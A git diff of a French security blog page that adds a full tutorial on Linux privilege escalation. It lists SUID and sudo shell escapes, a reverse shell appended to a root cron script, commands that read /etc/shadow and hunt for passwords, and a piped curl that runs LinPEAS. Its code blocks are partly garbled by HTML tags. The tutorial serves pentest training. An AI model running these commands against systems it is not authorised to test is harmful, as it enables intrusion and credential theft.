@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Élévation de privilèges Linux : techniques et méthodes — Temgus.CyberBlog</title>
 <meta name="description" content="SUID, sudo mal configuré, cron jobs, capabilities, LinPEAS — toutes les techniques de privesc Linux avec exemples.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/privilege-escalation-linux.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/privilege-escalation-linux.html">
 <meta property="og:title" content="Élévation de privilèges Linux : techniques et méthodes — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Élévation de privilèges Linux : techniques et méthodes — Temgus.CyberBlog">
 <meta name="twitter:description" content="SUID, sudo mal configuré, cron jobs, capabilities, LinPEAS — toutes les techniques de privesc Linux avec exemples.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,515 @@
   "headline": "Élévation de privilèges Linux : techniques et méthodes",
   "description": "SUID, sudo mal configuré, cron jobs, capabilities, LinPEAS — toutes les techniques de privesc Linux avec exemples.",
   "datePublished": "2025-08-17",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/privilege-escalation-linux.html",
   "inLanguage": "fr",
   "keywords": "privesc, Linux, SUID, sudo, GTFOBins",
-  "timeRequired": "PT12M"
+  "timeRequired": "PT12M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">⬆️</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Élévation de privilèges Linux : techniques et méthodes</h1>
-  <p style="color:#8892a4;max-width:500px">SUID, sudo mal configuré, cron jobs, capabilities, LinPEAS — toutes les techniques de privesc Linux avec exemples.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#privilege-escalation-linux" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">⬆️</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Élévation de privilèges Linux : techniques et méthodes</div>
+      <div class="meta-details">
+        <span>📅 2025-08-17</span>
+        <span>⏱ 12 min de lecture</span>
+        <span>🏷 Intermédiaire</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#m-thodologie-g-n-rale">Méthodologie générale</a></li>
+<li><a href="#-num-ration-manuelle">Énumération manuelle</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#informations-syst-me">Informations système</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#processus-et-services">Processus et services</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#fichiers-et-permissions">Fichiers et permissions</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#sudo">Sudo</a></li>
+<li><a href="#vecteurs-courants">Vecteurs courants</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#1-suid-binaires">1. SUID binaires</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#2-sudo-mal-configur-">2. Sudo mal configuré</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#3-cron-jobs-vuln-rables">3. Cron jobs vulnérables</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#4-mots-de-passe-dans-les-fichiers">4. Mots de passe dans les fichiers</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#5-services-vuln-rables-en-local">5. Services vulnérables en local</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#6-capabilities">6. Capabilities</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#7-kernel-exploits">7. Kernel exploits</a></li>
+<li><a href="#outils-automatis-s">Outils automatisés</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#linpeas-le-plus-complet">LinPEAS — Le plus complet</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#linenum">LinEnum</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#linux-smart-enumeration-lse-sh-">Linux Smart Enumeration (lse.sh)</a></li>
+<li><a href="#exemple-de-workflow-complet">Exemple de workflow complet</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Élévation de privilèges Linux : techniques et méthodes</h1>
+
+<p>Obtenir un shell sur un système n'est que la première étape. L'élévation de privilèges (privilege escalation ou privesc) consiste à passer d'un utilisateur standard à root. C'est une compétence fondamentale en pentest.</p>
+
+<h2 id="m-thodologie-g-n-rale">Méthodologie générale</h2>
+
+<p>La privesc Linux suit une méthodologie en plusieurs étapes :</p>
+
+<pre><code>1. Reconnaissance (enumération)
+<li>Identifier les vecteurs potentiels</li>
+<li>Vérifier et exploiter</li>
+<li>Documenter</code></pre></li>
+
+<p><strong>Règle d'or</strong> : l'énumération est 80% du travail. Plus vous collectez d'informations, plus vous trouvez de vecteurs.</p>
+
+<h2 id="-num-ration-manuelle">Énumération manuelle</h2>
+
+<h3 id="informations-syst-me">Informations système</h3>
+<pre><code class="language-bash"># Version du système
+<p>uname -a</p>
+<p>cat /etc/os-release</p>
+<p>cat /proc/version</p>
+
+<h1>Utilisateur courant</h1>
+<p>id</p>
+<p>whoami</p>
+<p>groups</p>
+
+<h1>Utilisateurs du système</h1>
+<p>cat /etc/passwd</p>
+<p>cat /etc/shadow  # Si lisible = jackpot</p>
+<p>who             # Utilisateurs connectés</code></pre>
+
+<h3 id="processus-et-services">Processus et services</h3>
+<pre><code class="language-bash"># Processus en cours
+<p>ps aux</p>
+<p>ps aux | grep root  # Processus root</p>
+
+<h1>Services</h1>
+<p>systemctl list-units --type=service</p>
+<p>netstat -tlnp</p>
+<p>ss -tlnp</p>
+
+<h1>Cron jobs</h1>
+<p>crontab -l</p>
+<p>cat /etc/crontab</p>
+<p>ls -la /etc/cron.*</code></pre>
+
+<h3 id="fichiers-et-permissions">Fichiers et permissions</h3>
+<pre><code class="language-bash"># Fichiers SUID (s'exécutent avec les droits du propriétaire)
+<p>find / -perm -4000 -type f 2&gt;/dev/null</p>
+
+<h1>Fichiers SGID</h1>
+<p>find / -perm -2000 -type f 2&gt;/dev/null</p>
+
+<h1>Fichiers world-writable</h1>
+<p>find / -perm -o+w -type f 2&gt;/dev/null</p>
+
+<h1>Capabilities</h1>
+<p>getcap -r / 2&gt;/dev/null</p>
+
+<h1>Fichiers appartenant à root mais éditables</h1>
+<p>find / -user root -writable 2&gt;/dev/null | grep -v /proc</code></pre>
+
+<h3 id="sudo">Sudo</h3>
+<pre><code class="language-bash"># Voir les droits sudo
+<p>sudo -l</p>
+
+<h1>Exemple de sortie intéressante</h1>
+<p>(root) NOPASSWD: /usr/bin/python3</p>
+<p>(root) NOPASSWD: /usr/bin/vim</p>
+<p>(root) NOPASSWD: /usr/bin/find</code></pre>
+
+<h2 id="vecteurs-courants">Vecteurs courants</h2>
+
+<h3 id="1-suid-binaires">1. SUID binaires</h3>
+
+<p>Les binaires avec le bit SUID s'exécutent avec les droits du propriétaire (souvent root).</p>
+
+<p><strong>Référence incontournable</strong> : <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> — liste tous les binaires exploitables.</p>
+
+<pre><code class="language-bash"># Trouver les SUID
+<p>find / -perm -4000 -type f 2&gt;/dev/null</p>
+
+<h1>Exemples d'exploitation</h1>
+
+<h1>/usr/bin/find avec SUID</h1>
+<p>find . -exec /bin/bash -p \; -quit</p>
+
+<h1>/usr/bin/python3 avec SUID</h1>
+<p>python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'</p>
+
+<h1>/usr/bin/vim avec SUID</h1>
+<p>vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'</p>
+
+<h1>/usr/bin/cp avec SUID — copier /etc/shadow</h1>
+<p>cp /etc/shadow /tmp/shadow_copy</code></pre>
+
+<h3 id="2-sudo-mal-configur-">2. Sudo mal configuré</h3>
+
+<p>GTFOBins est aussi votre référence pour sudo.</p>
+
+<pre><code class="language-bash"># Si sudo python3 autorisé
+<p>sudo python3 -c 'import os; os.system("/bin/bash")'</p>
+
+<h1>Si sudo vim autorisé</h1>
+<p>sudo vim -c ':!bash'</p>
+
+<h1>Si sudo find autorisé</h1>
+<p>sudo find / -name "*.txt" -exec /bin/bash \;</p>
+
+<h1>Si sudo less autorisé</h1>
+<p>sudo less /etc/hosts</p>
+<h1>Dans less : !bash</h1>
+
+<h1>Si sudo awk autorisé</h1>
+<p>sudo awk 'BEGIN {system("/bin/bash")}'</code></pre>
+
+<h3 id="3-cron-jobs-vuln-rables">3. Cron jobs vulnérables</h3>
+
+<pre><code class="language-bash"># Script cron world-writable
+<p>cat /etc/crontab</p>
+<h1><em>/5 </em> <em> </em> * root /opt/backup.sh</h1>
+
+<h1>Si /opt/backup.sh est writable</h1>
+<p>echo 'bash -i &gt;&amp; /dev/tcp/VOTRE_IP/4444 0&gt;&amp;1' &gt;&gt; /opt/backup.sh</p>
+<h1>Attendre l'exécution du cron</code></pre></h1>
+
+<h3 id="4-mots-de-passe-dans-les-fichiers">4. Mots de passe dans les fichiers</h3>
+
+<pre><code class="language-bash"># Chercher des mots de passe en clair
+<p>grep -r "password" /var/www/ 2&gt;/dev/null</p>
+<p>grep -r "passwd" /home/ 2&gt;/dev/null</p>
+<p>find / -name "*.conf" -exec grep -l "password" {} \; 2&gt;/dev/null</p>
+<p>find / -name "*.php" -exec grep -l "db_pass" {} \; 2&gt;/dev/null</p>
+
+<h1>Historique de commandes</h1>
+<p>cat ~/.bash_history</p>
+<p>cat ~/.zsh_history</code></pre>
+
+<h3 id="5-services-vuln-rables-en-local">5. Services vulnérables en local</h3>
+
+<pre><code class="language-bash"># Ports ouverts uniquement en local
+<p>netstat -tlnp | grep 127.0.0.1</p>
+<p>ss -tlnp | grep 127.0.0.1</p>
+
+<h1>Tunneler un service local avec SSH</h1>
+<p>ssh -L 8080:127.0.0.1:8080 user@target</code></pre>
+
+<h3 id="6-capabilities">6. Capabilities</h3>
+
+<pre><code class="language-bash"># Lister les capabilities
+<p>getcap -r / 2&gt;/dev/null</p>
+
+<h1>python3 avec cap_setuid</h1>
+<p>python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</p>
+
+<h1>perl avec cap_setuid</h1>
+<p>perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'</code></pre>
+
+<h3 id="7-kernel-exploits">7. Kernel exploits</h3>
+
+<p>En dernier recours si aucun autre vecteur n'est trouvé.</p>
+
+<pre><code class="language-bash"># Version du kernel
+<p>uname -r</p>
+
+<h1>Chercher des exploits kernel</h1>
+<p>searchsploit linux kernel 5.4</p>
+<h1>ou rechercher sur exploit-db.com</h1>
+
+<h1>Exemples d'exploits kernel connus</h1>
+<h1>DirtyPipe (CVE-2022-0847) - kernel 5.8 à 5.16.11</h1>
+<h1>DirtyCow (CVE-2016-5195) - kernels anciens</code></pre></h1>
+
+<h2 id="outils-automatis-s">Outils automatisés</h2>
+
+<h3 id="linpeas-le-plus-complet">LinPEAS — Le plus complet</h3>
+<pre><code class="language-bash"># Télécharger et exécuter
+<p>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</p>
+
+<h1>Sur la machine cible (sans internet)</h1>
+<h1>Uploader linpeas.sh puis</h1>
+<p>chmod +x linpeas.sh</p>
+<p>./linpeas.sh | tee linpeas_output.txt</code></pre>
+
+<h3 id="linenum">LinEnum</h3>
+<pre><code class="language-bash">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+<p>chmod +x LinEnum.sh</p>
+<p>./LinEnum.sh -t</code></pre>
+
+<h3 id="linux-smart-enumeration-lse-sh-">Linux Smart Enumeration (lse.sh)</h3>
+<pre><code class="language-bash">wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
+<p>chmod +x lse.sh</p>
+<p>./lse.sh -l 1   # Niveau 1 (basique)</p>
+<p>./lse.sh -l 2   # Niveau 2 (plus complet)</code></pre>
+
+<h2 id="exemple-de-workflow-complet">Exemple de workflow complet</h2>
+
+<pre><code class="language-bash"># 1. Infos de base
+<p>id; uname -a; cat /etc/os-release</p>
+
+<h1>2. SUID rapide</h1>
+<p>find / -perm -4000 -type f 2&gt;/dev/null</p>
+
+<h1>3. Sudo</h1>
+<p>sudo -l</p>
+
+<h1>4. Crons</h1>
+<p>cat /etc/crontab; ls /etc/cron.<em>/</em></p>
+
+<h1>5. Capabilities</h1>
+<p>getcap -r / 2&gt;/dev/null</p>
+
+<h1>6. Mots de passe</h1>
+<p>find / -name "*.conf" 2&gt;/dev/null | xargs grep -l "password" 2&gt;/dev/null</p>
+
+<h1>7. Lancer LinPEAS pour une analyse complète</h1>
+<p>./linpeas.sh</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>La privesc Linux repose sur une énumération méthodique et la connaissance des vecteurs courants. GTFOBins et LinPEAS sont vos meilleurs alliés. La pratique sur des machines HackTheBox et TryHackMe est indispensable pour développer les bons réflexes — chaque machine apporte de nouveaux vecteurs à connaître.</p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#privilege-escalation-linux" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/john-hashcat-cracking.html" class="nav-prev">← John the Ripper et Hashcat : cracker les mots de passe</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/privilege-escalation-windows.html" class="nav-next">Élévation de privilèges Windows : techniques avancées →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
